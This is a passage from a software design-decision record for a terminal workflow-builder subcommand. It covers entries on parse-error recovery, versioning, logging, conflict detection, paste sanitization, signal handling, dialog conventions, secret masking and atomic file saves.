- **Question:** After the user fixes a parse error via the external editor, does the builder automatically attempt to reload?
- **Decision:** Yes. After a successful external-editor invocation from the recovery view, the builder automatically re-parses the file. If parsing succeeds, the builder transitions directly to the edit view. If parsing still fails, the builder stays in the recovery view with the updated parse-error details.
- **Rationale:** UX-010. Forcing the user through landing-page round-trip to fix a typo is punishing.
- **Evidence:** UX-010.
- **Rejected alternatives:**
  - Require manual reload action.
  - Require full landing-page round-trip.
- **Linked technical notes:** —
- **Driven by findings:** F10
- **Dependent decisions:** —
- **Referenced in spec:** Alternate Flows — Parse-error recovery

## D37: Version bump

- **Question:** What version bump does this feature require, and how is it delivered?
- **Decision:** Shipping the `pr9k workflow` subcommand is a backwards-compatible addition to the CLI surface. Per `docs/coding-standards/versioning.md`'s 0.y.z rules, backwards-compatible CLI additions bump the patch version. The version bump is **its own commit** within the feature PR (or a separate PR landed first), not a drive-by edit mixed into a feature commit. The coding standard explicitly calls the bundled form "a drive-by edit in a feature PR" and prohibits it; the single-file `version.go` exception does not apply because this feature introduces substantial Go source outside `version.go`.
- **Rationale:** DevOps Finding 1 / Jr-F6 flagged the bump itself; adversarial review F57 (and the Jr-F1 of this round) flagged the original wording "must also include the version bump commit" as ambiguous — a reader could interpret "include" as "bundle into a feature commit." The coding standard is explicit that the bump travels in its own commit so diff reviewers can audit the version change independently of feature code. The subcommand name becomes part of pr9k's public API; downstream tooling gating on a minimum pr9k version needs a version to gate on.
- **Evidence:** `docs/coding-standards/versioning.md` — 0.y.z rules AND the "bump is its own commit, not a drive-by edit in a feature PR" rule on the same page. `src/internal/version/version.go` is the single source of truth.
- **Rejected alternatives:**
  - Minor bump — reserved for schema-breaking additions under 0.y.z.
  - No bump — hides the surface change from downstream gating.
  - Bundling the bump into a feature commit — prohibited by the coding standard.
- **Linked technical notes:** —
- **Driven by findings:** F21, F57
- **Dependent decisions:** —
- **Referenced in spec:** Versioning

## D38: Documentation obligations

- **Question:** What documentation must ship with this feature?
- **Decision:** The feature PR includes: `docs/features/workflow-builder.md`; `docs/how-to/using-the-workflow-builder.md`; `docs/how-to/configuring-external-editor-for-workflow-builder.md`; an ADR recording the atomic-rename save pattern (new to the codebase); a `docs/code-packages/` entry for each new Go package; updates to `docs/features/cli-configuration.md` covering the new subcommand; updates to `CLAUDE.md` linking every new doc; updates to `docs/architecture.md` if new top-level packages are introduced.
- **Rationale:** `docs/coding-standards/documentation.md` — docs must ship with the feature, not as follow-up PRs. DevOps Finding 2 / Jr-F7.
- **Evidence:** `docs/coding-standards/documentation.md`.
- **Rejected alternatives:**
  - Defer docs to follow-up PR.
- **Linked technical notes:** —
- **Driven by findings:** F22
- **Dependent decisions:** —
- **Referenced in spec:** Documentation Obligations

## D39: Shared-install visibility and observability

- **Question:** How does the builder make shared-install mutations and session outcomes visible?
- **Decision:** When saving to a directory not owned by the current user, the session header shows a "shared install" banner alerting the user that the save will affect other users of the same pr9k install. Builder session events (session start with chosen target, saves with their outcomes, external-editor invocations with exit codes, quits) are logged to the same `.pr9k/logs/` location the main `pr9k` already uses.
- **Rationale:** Security-F7 / DevOps Finding 4 (multi-user case) and DevOps Finding 5 (observability gap). A single logging surface keeps diagnosis tooling consistent across run-time and edit-time.
- **Evidence:** Security-F7, DevOps-5. Existing logger at `src/internal/logger/`.
- **Rejected alternatives:**
  - No logging — denies debuggability.
  - Separate log file — duplicates infrastructure.
- **Linked technical notes:** —
- **Driven by findings:** F39, F43
- **Dependent decisions:** —
- **Referenced in spec:** Edge Cases table (shared-install row); Coordinations — Session log

## D40: Unsaved-quit compound state

- **Question:** What happens when the user picks "save" in the unsaved-changes-quit dialog and the save surfaces fatal findings?
- **Decision:** Dismiss the quit dialog, return the user to the edit view with the findings panel open, and cancel the quit. Escape in the dialog is equivalent to cancel.
- **Rationale:** UX-011. The save-from-quit path has a real compound state the spec must describe.
- **Evidence:** UX-011.
- **Rejected alternatives:**
  - Leave the dialog open over the findings panel.
  - Quit-without-saving despite fatals.
- **Linked technical notes:** —
- **Driven by findings:** F11
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 10; Alternate Flows — Unsaved-changes quit

## D41: Cross-session mutation detection

- **Question:** How does the builder detect and communicate concurrent or intervening changes to the configuration file?
- **Decision:** On load, snapshot the configuration file's modification time and size. After every successful save, the builder refreshes this snapshot so the next comparison is against the just-written state. At save, re-stat the file; if the values have changed since the snapshot, show a conflict dialog naming the mismatch with three actions: overwrite with the builder's in-memory state, reload from disk and discard in-memory edits, or cancel the save. Last-completed-save wins when two builder sessions save simultaneously — the mtime snapshot catches only on-disk changes, not a concurrent builder session that has not yet saved. **Known limitation:** on filesystems with one-second mtime resolution (HFS+, FAT32, many network filesystems), two saves within the same clock second that produce files of identical size are indistinguishable from no external change; the conflict dialog will not fire. This is a best-effort signal — documented as a known limitation rather than hidden.
- **Rationale:** Edge-case 10-A drove the original decision. Adversarial review (F58) verified the same-second same-size false-negative path and flagged that silence about it sets the wrong user expectation. Edge-case review round 2 (F59) caught the missing snapshot refresh after save — without it, every save after the first in a session would see its own write as a conflict (because the file's current mtime matches the just-written state but the snapshot is the pre-save value). Full cross-process locking is out of scope (D9), but a best-effort collision signal is much better than silent overwrite for the common case.
- **Evidence:** Edge-case 10-A, Security-F9. Filesystem mtime resolution documented in APFS/ext4 vs. HFS+/FAT32 platform notes (nanosecond vs. one-second). Adversarial-validator F58. Edge-case-explorer round 2 F59.
- **Rejected alternatives:**
  - Multi-session locking — out of scope.
  - No detection — silent overwrite.
  - Hide the same-second false-negative case from users — rejected for honest-expectation-setting.
- **Linked technical notes:** T1
- **Driven by findings:** F23, F28, F34, F41, F58, F59
- **Dependent decisions:** —
- **Referenced in spec:** Edge Cases table; Out of Scope

## D41-b: Test strategy for T1, T2, and TUI modes

- **Question:** What is the test contract for the new patterns T1 and T2, and for the TUI modes as a whole?
- **Decision:** T1 (atomic save) is covered by unit tests that simulate write failure between temp-file write and rename, asserting the on-disk file is unchanged. T2 (terminal handoff) is covered via an injectable editor-runner interface so external-editor invocation is tested without a real TTY, following the `sandboxCreateDeps` / `sandboxLoginDeps` dependency-injection pattern. Every TUI mode — landing page, edit view, findings panel, unsaved-changes dialog, parse-error recovery view, symlink banner, external-workflow banner, shared-install banner, unknown-field warning — has Bubble Tea model-update tests following the main TUI pattern. Race detector is required (`go test -race`).
- **Rationale:** DevOps Finding 7. Both T1 and T2 are new-to-codebase patterns; without explicit test commitments they ship untested.
- **Evidence:** DevOps-7. DI pattern at `src/cmd/pr9k/sandbox_create.go:19`. Testing standard `docs/coding-standards/testing.md`.
- **Rejected alternatives:**
  - Defer testing to implementation time without commitments.
- **Linked technical notes:** T1, T2
- **Driven by findings:** F45
- **Dependent decisions:** —
- **Referenced in spec:** Testing

## D42: Structured field input sanitization

- **Question:** What happens when the user pastes multi-line or ANSI-escaped content into a single-line input field?
- **Decision:** Newlines and ANSI escape sequences are stripped from pasted input at input time. The field accepts the sanitized remainder. When stripping occurs, a brief "pasted content sanitized" message is shown. Structured fields (step names, model names, prompt paths, script paths) additionally enforce a soft length cap with a visible warning when exceeded.
- **Rationale:** Edge-case 7-A, 7-B, 7-C. An un-sanitized newline in a step name produces a valid-JSON but confusing workflow; ANSI escapes pass through to the log panel and status-line.
- **Evidence:** Edge-case 7-A, 7-B, 7-C. Existing ANSI stripping in sandbox output at `src/cmd/pr9k/sandbox.go:73` (the `stripANSI` function; the regex var it uses is at line 69).
- **Rejected alternatives:**
  - Preserve all pasted content — creates structural-field corruption.
  - Reject the paste entirely — unhelpful when paste is mostly fine.
- **Linked technical notes:** —
- **Driven by findings:** F29, F31, F47
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 7; Edge Cases table

## D42-a: Crash-era temp file cleanup contract

- **Question:** How and when does the builder clean up a temporary file left by a previous crashed save?
- **Decision:** On opening a target directory, the builder scans for temp files matching its convention (temp-file naming described in T1). If any are found, the builder shows a non-blocking notice naming the file and its modification time, and offers to delete it silently or leave it. Cleanup never happens without user consent; the builder does not auto-delete on load. On save, the temp file created by the previous save attempt (if any) is overwritten cleanly as part of the atomic-rename path.
- **Rationale:** DevOps Finding 3. Silent auto-delete could destroy the evidence of a previous problem; user-consented cleanup keeps diagnosis possible.
- **Evidence:** DevOps-3.
- **Rejected alternatives:**
  - Auto-delete on load.
  - Never clean up.
- **Linked technical notes:** T1
- **Driven by findings:** F42
- **Dependent decisions:** —
- **Referenced in spec:** Alternate Flows — Crash-era temporary file on open

## D43: Load-time integrity checks

- **Question:** What non-fatal integrity issues does the builder surface on load?
- **Decision:** On load, the builder detects and surfaces: UTF-8 BOM presence (strips before parsing, notes in banner); non-UTF-8 encoding (refuses to parse, enters recovery view with encoding note); empty file (enters recovery view with empty-file note); duplicate JSON keys (non-blocking banner listing keys and the winning value); trailing content after the closing `}` (non-blocking banner warning the content will be dropped on save).
- **Rationale:** Edge-case 2-A, 2-C, 2-D, 2-G. Go's JSON decoder is silent about BOM, duplicates, trailing content, and empty files; the builder must not inherit that silence for its primary artifact.
- **Evidence:** Edge-case 2-A, 2-C, 2-D, 2-G.
- **Rejected alternatives:**
  - Treat all as fatal parse errors — noisy for benign cases.
  - Treat all as silent — loses user-visible data.
- **Linked technical notes:** —
- **Driven by findings:** F25
- **Dependent decisions:** —
- **Referenced in spec:** Edge Cases table; Alternate Flows — Parse-error recovery

## D44: Signal handling

- **Question:** How does the builder handle SIGHUP, SIGTSTP, and SIGINT during the session?
- **Decision:** SIGINT received outside of an external-editor invocation triggers the standard quit flow (unsaved-changes confirmation). SIGINT during an external-editor invocation is delivered to the editor's process group; if the editor handles it, the editor exits and control returns. SIGHUP (terminal disconnect) terminates the builder immediately; unsaved changes are lost — documented as a known limitation with `nohup` or terminal-multiplexer as the mitigation. SIGTSTP (Ctrl-Z) releases the terminal back to the shell, suspending the builder; on resume the builder reclaims the terminal and re-renders.
- **Rationale:** Edge-case 9-B, 9-C. Documenting the behavior is more honest than pretending the cases don't exist.
- **Evidence:** Edge-case 9-B, 9-C. Existing signal handling at `docs/features/signal-handling.md`.
- **Rejected alternatives:**
  - Catch SIGHUP and auto-save — risky; a terminal disconnect is often a symptom of a broader problem, and auto-save could write a half-complete state.
  - Refuse to handle SIGTSTP — frustrating for users who expect Ctrl-Z to work.
- **Linked technical notes:** —
- **Driven by findings:** F33
- **Dependent decisions:** —
- **Referenced in spec:** Edge Cases table

## D45: Choice-list keyboard contract

- **Question:** How does a constrained-value choice list behave under keyboard interaction — open, navigate, confirm, dismiss?
- **Decision:** When a constrained-value field is focused, `Enter` or `Space` opens its choice list. `↑`/`↓` navigate between options. `Enter` confirms the highlighted option and closes the list. `Escape` dismisses the list restoring the previously saved value (no change committed). Typing an alphabetic character while the list is open jumps to the next option whose label starts with that character (typeahead).
- **Rationale:** UX-008 flagged that choice-list keyboard behavior was unspecified — the `▾` glyph signaled the field was constrained but told the user nothing about how to interact. Without spec-level commitment, implementations would diverge (Enter opens vs. Enter selects vs. no keyboard support). The footer's per-focus shortcut list cannot be populated without these bindings. The chosen conventions match standard dropdown idioms used across GUI and TUI frameworks.
- **Evidence:** UX round 2 F61.
- **Rejected alternatives:**
  - Space-only to open — less discoverable; Enter is the universal confirm key users try first.
  - Escape exits edit-view entirely — disruptive and inconsistent with Escape as cancel elsewhere.
- **Linked technical notes:** —
- **Driven by findings:** F61
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 7; User Interactions — Affordances

## D46: Add-item affordance and keyboard binding

- **Question:** How does the user discover and trigger "add a step" or "add an env entry" or "add a containerEnv pair"?
- **Decision:** Every list-typed outline section (each phase, `env`, `containerEnv`) ends with a visible trailing row rendered as `+ Add <item-type>` (for example, `+ Add step`, `+ Add env variable`, `+ Add container env entry`). Focus on this row shows `Enter  add` in the shortcut footer. `Enter` creates a new empty item of that type, focuses its first editable field (in the detail pane), and shifts the `+ Add ...` row down so another add is one keystroke away. The same affordance is invoked by mouse click. The keyboard shortcut `a` while a phase header or list section header is focused is a secondary entry point that jumps to the `+ Add` row and triggers it in one keystroke.
- **Rationale:** UX round 2 F62 flagged add-step as a task-blocker — the prior spec said "add-step affordances at the phase level" without naming the signifier or the key. The visible trailing row is the most discoverable pattern available in a purely text terminal (no hover, no right-click menu tradition); it also normalizes every list-typed section under the same affordance. The secondary `a` keybinding gives keyboard-fluent users a single-key path without hunting for the row.
- **Evidence:** UX round 2 F62. Nielsen heuristic 6 (recognition over recall).
- **Rejected alternatives:**
  - Footer-only `a` shortcut with no visible row — users who skim the outline see no add affordance.
  - Right-click context menu — the existing TUI has no right-click handling (see `src/internal/ui/model.go:217` — left-click/wheel only).
  - Separate "add-step mode" with modal prompt for kind — slower than "add empty then choose kind inline."
- **Linked technical notes:** —
- **Driven by findings:** F62
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 7; User Interactions — Affordances

## D47: Secret-reveal keyboard binding

- **Question:** How does a keyboard-only user reveal a masked `containerEnv` secret value?
- **Decision:** When a `containerEnv` value field whose key matches the secret pattern is focused, the detail pane renders the value as the masked placeholder `••••••••` (eight bullets) with a small affixed label `[press r to reveal]`. Pressing `r` toggles the field between masked and revealed; the toggle state is per-field and lasts until focus leaves the field (on focus loss the field re-masks). The shortcut footer shows `r reveal` when focus is on a secret-masked field.
- **Rationale:** UX round 2 F63 flagged that D20 committed to "a reveal affordance the user can toggle" without naming the signifier or keybinding — a mouse-only user could toggle, a keyboard-only user could not. Equitable use (Universal Design Principle 1) requires both paths. Re-masking on focus loss prevents accidental exposure when the user tabs away from a revealed field without explicitly re-masking. The `[press r to reveal]` label is a small but persistent signifier — richer than a bare `••••••••` which gives the user no path forward.
- **Evidence:** UX round 2 F63. D20 original decision (mask by default with reveal toggle).
- **Rejected alternatives:**
  - Bare `••••••••` with no label — keyboard-only users have no discovery path.
  - Reveal state persists until session end — exposes secret across subsequent navigation.
  - `R` (shift+r) — collides with reorder mode (D34).
- **Linked technical notes:** —
- **Driven by findings:** F63
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 7; User Interactions — Feedback

## D48: Dialog convention standard

- **Question:** Do the builder's dialogs follow a consistent keyboard and visual convention?
- **Decision:** Every modal / dialog / non-blocking notice in the builder follows one convention:
  - **Escape is equivalent to "cancel"** or "no" in every dialog. Escape never commits a destructive action.
  - **The safe option (cancel / keep / leave) is the keyboard default** — it is the option activated by pressing `Enter` from the initial dialog state.
  - **Destructive options are never the keyboard default** and are always at least one explicit navigation away (arrow key or Tab) from the initial focus.
  - **Option vocabulary is drawn from a fixed lexicon:** Save, Discard, Overwrite, Reload, Cancel, Close, Delete, Keep, Retry, Confirm. Ad-hoc labels ("leave", "continue anyway") are normalized to the lexicon.
  - **Option spatial order, left-to-right or top-to-bottom:** primary-safe action first, secondary actions middle, destructive last.
  - **Dialogs re-layout on terminal resize** (same behavior the existing TUI applies to overlays).
- **Rationale:** UX round 2 F64 catalogued eight distinct dialogs across the spec with inconsistent option vocabularies and unspecified Escape behavior. Establishing a single convention at spec level means the per-dialog text in the spec inherits the convention and implementations stay consistent without repeated per-dialog commitments.
- **Evidence:** UX round 2 F64.
- **Rejected alternatives:**
  - Per-dialog convention — guarantees inconsistency across eight dialogs.
  - Ad-hoc option labels — each dialog reads differently, trains the user inconsistently.
- **Linked technical notes:** —
- **Driven by findings:** F64
- **Dependent decisions:** —
- **Referenced in spec:** new Dialog Conventions section; Alternate Flows (all dialogs)

## D49: Session-header banner priority

- **Question:** When multiple session-header banners are simultaneously active, how does the builder present them?
- **Decision:** The session header shows at most one warning banner at a time, selected by the following priority (highest first): read-only, external-workflow, symlink, shared-install, unknown-field. The suppressed banners are accessible via a `[N more warnings]` indicator on the session header that opens a banner panel listing all active banners when selected. The persistent-state indicators (target path, unsaved-changes indicator) always render, regardless of banner count.
- **Rationale:** UX round 2 F65 flagged that the session header could legitimately carry five warning banners plus target path plus unsaved-changes indicator plus findings summary simultaneously, overflowing on narrow terminals. Progressive disclosure (highest-priority banner only, with affordance to see the others) keeps critical context visible without crowding. Priority ordering puts the most actionable warning first: read-only is the most-limiting (no save possible), followed by the visibility-critical security warnings (external, symlink), then informational warnings (shared-install, unknown-field).
- **Evidence:** UX round 2 F65. Nielsen heuristic 8 (aesthetic and minimalist design).
- **Rejected alternatives:**
  - Stack all banners vertically — consumes vertical space needed for outline and detail pane on short terminals.
  - Show all banners on one line with pipe separators — overflows at 80 columns.
  - Hide all banners except the first active — loses actionable information silently.
- **Linked technical notes:** —
- **Driven by findings:** F65
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 5; User Interactions — Affordances

## D50: Landing-page option subtitles — SUPERSEDED by D64

- **Status:** Superseded by [D64](#d64-menu-bar-target-selection-model) in review round 2.
- **Original decision:** Each landing-page option rendered with a one-line subtitle showing the resolved absolute path.
- **Why superseded:** The landing page was replaced by the File menu. Path recognition is now provided by the path picker's pre-filled default value (File > New and File > Open both show an editable path with sensible defaults) rather than by labeled subtitles on landing-page options.
- **Driven by findings:** F66, F83
- **Referenced in spec:** historical only.

## D51: Section summary content

- **Question:** What does the detail pane show when a section header in the outline is focused?
- **Decision:** Each of the six outline section types has a defined summary content in the detail pane:
  - **`env` section:** a comma-separated list of up to 8 env variable names, with `+ N more` suffix if the list exceeds 8. Count of total entries shown above the list.
  - **`containerEnv` section:** same treatment on the keys — key names only, never the values. Secret-named keys are shown but still masked. Count of total entries above.
  - **`statusLine` block (when present):** the `type` value, the `command` value (truncated with ellipsis if longer than the pane width), and the resolved `refreshIntervalSeconds` value.
  - **`initialize` phase:** the count of steps; an ordered list of up to 8 step names, each annotated with its kind (Claude / shell), with `+ N more` if exceeded.
  - **`iteration` phase:** same as initialize.
  - **`finalize` phase:** same as initialize.
  - **Any empty section** (zero items): renders `(empty — no items configured)` in the detail pane, along with the same `+ Add <item-type>` affordance that appears in the outline (so the user can add an item from either side).
- **Rationale:** UX round 2 F67 flagged that D28 committed to a "section summary" containing "counts, top-level field values" without enumerating what those are per section type. Without enumeration, implementations would render empty pages or near-empty counts that fail the visibility heuristic. Enumerating the content here commits to a useful summary across all six section types.
- **Evidence:** UX round 2 F67.
- **Rejected alternatives:**
  - Count-only summary — uninformative for users who collapsed a section to scan it.
  - Show all items without truncation — unbounded content in the detail pane.
- **Linked technical notes:** —
- **Driven by findings:** F67
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 5; User Interactions — Affordances

## D52: Detail pane scrollability

- **Question:** How does the detail pane behave when a step or section has more fields than fit in the visible pane height?
- **Decision:** The detail pane is independently scrollable from the outline, with a visible scroll-position indicator when its content exceeds viewport height. Keyboard Tab / arrow navigation between fields auto-scrolls the pane to keep the focused field visible. Mouse wheel events are routed to whichever pane the pointer is over (outline when pointer is left of the split, detail pane when pointer is right).
- **Rationale:** UX round 2 F68 flagged that D29 specified outline scrollability but said nothing about the detail pane. A Claude step has eleven fields (name, model, promptFile, isClaude, captureAs, captureMode, breakLoopIfEmpty, skipIfCaptureEmpty, timeoutSeconds, onTimeout, resumePrevious) — on a modest-height terminal the pane cannot show them all. Without an independent scroll commitment, fields below the fold are invisible.
- **Evidence:** UX round 2 F68. D29 (outline scrollability precedent).
- **Rejected alternatives:**
  - Share the outline's scroll — conflates two independent contents.
  - Page-based detail pane — less smooth than continuous scroll.
- **Linked technical notes:** —
- **Driven by findings:** F68
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 5; User Interactions — Affordances

## D53: Post-save success feedback

- **Question:** What does the user see immediately after a successful save?
- **Decision:** Three feedback elements fire together on successful save: (a) the session header's unsaved-changes indicator clears; (b) a transient status line reading `Saved at HH:MM:SS` appears in the session header for 3 seconds, then clears to the normal session-header state; (c) if the save required validator acknowledgment for non-blocking findings, the acknowledgment dialog is dismissed. No other state changes — outline focus, detail pane focus, and scroll positions are preserved.
- **Rationale:** UX round 2 F69 flagged that the original spec said "save proceeds silently" when there were no findings — silence is the absence of feedback, not a success state. Users need explicit confirmation that their write landed. The transient timestamp in the banner gives positive confirmation without permanently consuming header space. The 3-second duration matches standard TUI toast conventions.
- **Evidence:** UX round 2 F69. Nielsen heuristic 1 (visibility of system status).
- **Rejected alternatives:**
  - Silent success — fails visibility heuristic.
  - Modal "Saved" dialog — adds a click-through for every save.
  - Persistent "Saved at HH:MM:SS" until next action — clutters the header.
- **Linked technical notes:** —
- **Driven by findings:** F69
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 9; User Interactions — Feedback

## D54: Discard safety in unsaved-quit dialog

- **Question:** How does the builder protect against accidental discard of an entire session's unsaved edits?
- **Decision:** In the unsaved-changes quit dialog, the keyboard-default option is **Cancel** (pressing `Enter` from the initial dialog state cancels the quit). The three options are spatially ordered: **Save** (primary safe), **Cancel** (also safe, and the escape-equivalent), **Discard** (destructive, rightmost, visually de-emphasized). Choosing Discard does NOT immediately discard — it prompts a second confirmation: `Discard all unsaved changes? This cannot be undone. (y/N)`, with `N` as the keyboard default. Only a positive `y` or explicit arrow+Enter through both prompts discards. Escape at any step cancels.
- **Rationale:** UX round 2 F70 / F71 flagged that the original three-way dialog had no confirmation guard on Discard, and that Discard could be reached from the initial dialog with a single misfire (down-arrow + Enter). D7's "no undo history" means Discard is irreversible. Given the stakes (all session edits lost), the two-step confirmation matches the pattern used for remove-step in the detail pane (D21) and prevents a fatigued user from losing their work via an accidental keystroke.
- **Evidence:** UX round 2 F70, F71. D7 ("no undo history"). Universal Design Principle 5 (tolerance for error).
- **Rejected alternatives:**
  - Single-step discard with cancel as default only — insufficient for irreversible action.
  - Three-step confirmation — disproportionate friction.
  - Require typing a specific word ("discard") — excessive for a keyboard TUI.
- **Linked technical notes:** —
- **Driven by findings:** F70, F71
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 10; Alternate Flows — Unsaved-changes quit

## D55: Focus restoration after findings-panel dismiss

- **Question:** Where does focus land when the user manually dismisses the findings panel?
- **Decision:** Focus returns to the field or outline item that was focused immediately before the panel was opened (or, equivalently, the last field the user interacted with before the panel took focus). If no prior focus was recorded (e.g., the panel was the first thing the user interacted with), focus lands on the first step of the iteration phase (same fallback as initial cursor focus in D26).
- **Rationale:** UX round 2 F72 flagged that the panel dismiss behavior had no specified focus-return point, which disorients keyboard-only users in the read-finding → fix-field → re-check-panel → dismiss cycle.
- **Evidence:** UX round 2 F72. WCAG 2.2 SC 2.4.3 (focus order).
- **Rejected alternatives:**
  - Focus always returns to the outline top — destroys the user's editing position.
  - Focus returns to the findings panel's position (i.e., "nothing" after dismiss) — non-sensical keyboard state.
- **Linked technical notes:** —
- **Driven by findings:** F72
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 9; D35

## D56: Error message template for edge-case failures

- **Question:** What content does each "clear error" in the Edge Cases table commit to?
- **Decision:** Every error-mode commitment in the Edge Cases table renders in a modal error dialog that includes, at minimum, four elements:
  1. **What happened** — a single sentence naming the operation that failed, in user-visible vocabulary ("Could not save workflow", "Could not read prompt file").
  2. **Why** — a short phrase naming the condition (the OS error, the file path, or the validator finding that caused the failure).
  3. **In-memory state commitment** — either "Your edits are still in memory — you can retry or choose a different target" or "No edits were lost." This sentence is required for every failure that leaves edit state intact.
  4. **Available action** — a bulleted list of the dialog's options using the D48 lexicon (Retry, Cancel, Close, Reload, etc.) with the safe option as keyboard default per D48.
- **Rationale:** UX round 2 F73 flagged that "clear error" in the Edge Cases table was not a behavioral commitment — a `%v` dump of an OS error would technically satisfy "clear" while leaving users stranded. The four-element template aligns the Edge Cases table errors with the alternate-flow error dialogs, which already follow this shape (editor-spawn failure, parse-error recovery).
- **Evidence:** UX round 2 F73. Nielsen heuristic 9 (help users recover from errors).
- **Rejected alternatives:**
  - Let implementation write the message — guarantees inconsistency.
  - Three-element template (omit in-memory state commitment) — omits the most user-important reassurance.
- **Linked technical notes:** —
- **Driven by findings:** F73
- **Dependent decisions:** —
- **Referenced in spec:** Edge Cases table (all rows); User Interactions — Error states

## D57: Session definition and target switching

- **Question:** What starts and ends a builder session, and does session state persist across target switches within a running builder?
- **Decision:** A **session** begins when a workflow is loaded (via File > New completing, File > Open completing, or `--workflow-dir` auto-open at launch) and ends when either (a) the builder process exits, or (b) the user invokes File > New or File > Open, which starts a new session with a different workflow after any unsaved-changes interception. Between sessions — i.e., when the builder is running but no workflow is loaded — the builder shows the empty-editor hint state (D68). Session-scoped state includes: acknowledged warnings (D23), external-workflow first-save confirmation (D22), symlink first-save confirmation (D17), the unsaved-changes indicator, the outline scroll position, collapse state (D28), and the file-change snapshot (D41). All session-scoped state is discarded when the session ends; the new session starts fresh. If the current session has unsaved changes at the moment the user invokes File > New, File > Open, or File > Quit, the unsaved-changes dialog (D7, D54, D72) intercepts first; only after the user confirms discard, successful save, or cancel does the flow proceed. "Cancel" returns to the current session unchanged.
- **Rationale:** UX round 2 F74 and edge-case round 2 F75 / F76 flagged that "session" was used everywhere in the spec without a definition. R2 menu-bar redesign eliminates the landing page entirely — sessions now begin on explicit file load (New or Open) and transition via explicit menu actions rather than a landing-page round-trip. The simpler model (one active session at a time; switching sessions goes through the unsaved-changes guard) means no session bleed and no cross-target suppression state.
- **Evidence:** UX round 2 F74. Edge-case round 2 F75, F76. R2 menu-bar redesign.
- **Rejected alternatives:**
  - Session persists across File > Open — complicates suppression semantics.
  - File > Open does not check for unsaved changes — silent edit loss.
  - Allow multiple concurrent sessions — out of scope for v1.
- **Linked technical notes:** —
- **Driven by findings:** F74, F75, F76, F83
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow; new Session Lifecycle paragraph; Alternate Flows — Target switching

## D58: Model suggestion list maintenance

- **Question:** Who maintains the `model` field's suggestion list and how fresh does it stay?
- **Decision:** The suggestion list is a hardcoded snapshot at ship time drawn from Anthropic's then-current Claude model identifiers. No update contract attaches to the list — it is explicitly documented as potentially stale. The field accepts any string the user types, regardless of whether it matches a suggestion (D12 already commits to this; the schema does not constrain model values). The how-to guide (`docs/how-to/using-the-workflow-builder.md`, part of Documentation Obligations) includes a note that the suggestion list is illustrative, not authoritative, and points users to Anthropic's model reference for the current set.
- **Rationale:** Adversarial round 2 F77 flagged that D12 committed to a "suggestion list of known-good values" without any maintenance contract — a hardcoded list in Go will go stale within months of shipping. The choice here is to be honest rather than invent a maintenance process the project cannot guarantee. The value of the suggestion list is as a starting hint for users new to Claude model names; if it is stale, the user can still type the correct name and the validator accepts it.
- **Evidence:** Adversarial round 2 F77. D12 (model field free-text).
- **Rejected alternatives:**
  - Build a dynamic update mechanism — out of scope for v1 and introduces a network dependency.
  - Remove the suggestion list entirely — loses the starting-hint value for new users.
  - Declare a maintenance cadence the project will not follow — sets up false expectations.
- **Linked technical notes:** —
- **Driven by findings:** F77
- **Dependent decisions:** —
- **Referenced in spec:** User Interactions — Feedback note; Documentation Obligations (how-to guide note)

## D59: Coding-standards entry for save-durability pattern

- **Question:** Does the Documentation Obligations list include a coding-standards entry for T1, or only an ADR?
- **Decision:** Documentation Obligations is extended to include both an ADR recording the decision to adopt the atomic-save pattern AND a coding-standards entry at `docs/coding-standards/file-writes.md` (or equivalent, named at implementation time) codifying when and how the pattern must be used across the codebase. The ADR records the decision; the coding-standards entry codifies the rule for future contributors.
- **Rationale:** Jr round 2 F78 flagged that T1's closing sentence recommends codifying the pattern in coding standards, but the Documentation Obligations list mentioned only the ADR. An ADR and a coding-standards entry serve different audiences — ADR for history and rationale, coding-standards for day-to-day guidance. Shipping one without the other leaves the pattern discoverable from the ADR but not enforceable as a standard.
- **Evidence:** Jr round 2 F78. T1 tech-note text.
- **Rejected alternatives:**
  - ADR only — rule is not discoverable by contributors who skim `docs/coding-standards/`.
  - Coding-standards entry only — history and rationale missing.
- **Linked technical notes:** T1
- **Driven by findings:** F78
- **Dependent decisions:** —
- **Referenced in spec:** Documentation Obligations

## D60: Companion-file write atomicity

- **Question:** When the user saves a workflow for the first time (after scaffolding or after creating new prompt/script files during the session), what atomicity contract applies to the companion-file writes?
- **Decision:** The T1 atomic-rename pattern applies to every file the save writes, not only to the configuration file. Companion-file writes — newly created prompt files, newly created scripts, modified statusLine scripts — each use the same temp-file-plus-rename sequence as the configuration file. The save sequence writes every companion file first (each under its own atomic rename), then the configuration file last (also under its atomic rename). This ordering ensures that if the configuration save succeeds, every companion file it references is already on disk; if the configuration save fails, the companion files are already in place but the configuration still points to the prior state, so the user can retry. A partial failure during the companion-file phase (e.g., disk full on the 3rd of 5 new files) is surfaced in the save-failure error dialog naming the failing file; the user can retry after freeing space.
- **Rationale:** Jr round 2 F79 flagged that T1 committed to atomic configuration file save but the scaffold-from-empty alternate flow writes companion files at the same save, and the original spec was silent on their atomicity. A non-atomic companion write creates the exact tear-on-crash problem T1 was introduced to prevent — just moved to the companion files. The write-companion-then-config ordering is the safe sequence: companion files are referenced by the config, so committing them before committing the config reference ensures no dangling references.
- **Evidence:** Jr round 2 F79. T1 (atomic rename pattern).
- **Rejected alternatives:**
  - Companion files written directly (O_TRUNC) — creates partial-write risk on a crash.
  - Config written before companion files — dangling references on partial save.
- **Linked technical notes:** T1
- **Driven by findings:** F79
- **Dependent decisions:** —
- **Referenced in spec:** Alternate Flows — Scaffold-from-empty; Edge Cases table

## D61: Default-bundle reference-integrity check before copy

- **Question:** What happens when the user picks "copy from default" and the default bundle itself has a referenced-but-missing companion file?
- **Decision:** Before the copy begins, the builder validates the default bundle's internal reference integrity: every prompt and script referenced by config.json must exist in the default bundle. If any are missing, the builder shows an error dialog naming the missing files and offers two actions: **Copy anyway** (proceeds with the partial copy; user enters edit view with the validator's fatal findings for the missing files already known), or **Cancel** (returns to landing). The copy never enters edit view silently with a latent fatal.
